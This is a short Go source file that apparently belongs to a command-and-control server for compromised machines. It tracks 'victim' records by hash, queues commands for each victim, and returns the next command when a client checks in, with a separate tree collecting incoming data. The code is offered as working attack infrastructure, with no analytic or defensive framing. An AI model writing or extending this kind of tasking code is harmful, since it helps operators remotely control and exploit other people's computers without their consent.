package main
import (
    "sync"
	"fmt"
	rbt "github.com/emirpasic/gods/trees/redblacktree"
)

// Setup for Red and Black Tree
var clientTreeMutex sync.Mutex
var clientTree = rbt.NewWithStringComparator()

var superCatTree = rbt.NewWithStringComparator() // key: hash, value: []IncomingSuperCatData
var superCatMutex sync.Mutex

func HashGetNextCommand(incomingHash string) VictimCommand {
	//for any given incoming hash get if possible the next command to run return this so it can be sent to the client
	//
	clientTreeMutex.Lock()
	defer clientTreeMutex.Unlock()

	if val, found := clientTree.Get(incomingHash); found {
		victim := val.(VictimInfo)
		if len(victim.Commands) > 0 {
			nextCmd := victim.Commands[0]
			victim.Commands = victim.Commands[1:]
			clientTree.Put(incomingHash, victim)
			return nextCmd
		}
	}
	return VictimCommand{}
}

func DoesHashHaveMessages(inputHash string) bool {
	clientTreeMutex.Lock()
	defer clientTreeMutex.Unlock()

	if val, found := clientTree.Get(inputHash); found {
		victim := val.(VictimInfo)
		return len(victim.Commands) > 0
	}
	return false
}

func AddCommandToVictim(hash string, command VictimCommand) {
	clientTreeMutex.Lock()
	defer clientTreeMutex.Unlock()

	val, found := clientTree.Get(hash)
	if found {
		victim := val.(VictimInfo)
		victim.Commands = append(victim.Commands, command)
		clientTree.Put(hash, victim)
		fmt.Println("Added command to victim:", hash)
	} else {
		fmt.Println("Victim not found:", hash)
	}
}